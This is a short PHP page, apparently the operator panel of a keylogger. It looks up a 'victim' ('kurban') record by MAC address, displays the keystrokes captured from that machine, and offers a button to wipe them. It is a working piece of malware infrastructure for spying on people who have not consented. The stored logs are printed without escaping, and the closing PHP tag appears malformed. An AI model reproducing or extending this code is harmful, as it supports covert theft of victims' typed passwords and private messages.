<?php

  include("header.php");
ob_start();

include("vt.php");
	$cekilen_id=htmlspecialchars(strip_tags(addslashes(stripslashes($_GET["id"]))));//tüm html kodlardan ayırıyoruz.
	
		$sorgu = $db->prepare("SELECT * FROM kurban WHERE macadres=:id");				//istenilen id deki veriyi çekme
		$sorgu->execute(array(':id'=>$cekilen_id));
		if($sorgu->rowCount()){
			$row=$sorgu->fetch(PDO::FETCH_ASSOC);
?>
<br>
<form action="sill.php" method="POST" style="width:75%;">

<?php 



if($row['keylog']){
echo "<br><font face='tahoma' size='4' color='red'>Keyloglar</font><br><font face='tahoma' size='2' color='red'>".$row['keylog']."</font>";}

if(!$row['keylog']){
	echo "<br><font face='tahoma' size='3' color='red'>Keylog alınamadı.</font><br>";
		}else{
			echo "<input type='hidden' value='".$cekilen_id."' name='cekilen_id'>
<br><button type='submit'>Logları temizlemek için tıklayın</button><br>";
		}}

?>
<br>


</form>



<?php}ob_end_flush();?>

